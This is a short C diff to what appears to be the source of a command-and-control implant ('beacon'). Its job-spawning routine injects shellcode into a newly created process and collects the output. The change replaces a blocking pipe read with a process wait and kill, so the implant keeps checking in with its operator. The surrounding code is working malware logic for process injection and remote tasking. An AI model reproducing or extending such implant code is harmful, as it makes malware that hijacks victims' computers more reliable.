@@ -264,11 +264,18 @@ void command_job_spawn_logic(DWORD type, DWORD wait, DWORD offset, char * shellc
 	/* inject into the process */
 	inject_process_logic(&pi, pi.hProcess, pi.dwProcessId, shellcode, slen, offset, parameter, plen);
 
-	/* wait the user specified time for our process to complete */
+	/* wait the user specified time for our process to complete.
+	 * PeekNamedPipe on the inherited stdout pipe can block forever if the
+	 * job process is stuck in loader/CLR (x86 EA). Wait on the process
+	 * handle instead; if it is still alive after wait, kill it so the
+	 * pipe unblocks and the beacon thread can check in. */
 	if (wait > 60000)
 		wait = 20000;
 	if (wait > 0) {
-		pipe_try(read_stdout, wait);
+		WaitForSingleObject(pi.hProcess, wait);
+		if (WaitForSingleObject(pi.hProcess, 0) == WAIT_TIMEOUT)
+			TerminateProcess(pi.hProcess, 1);
+		pipe_try(read_stdout, 1);
 	}
 
 	/* track this process */
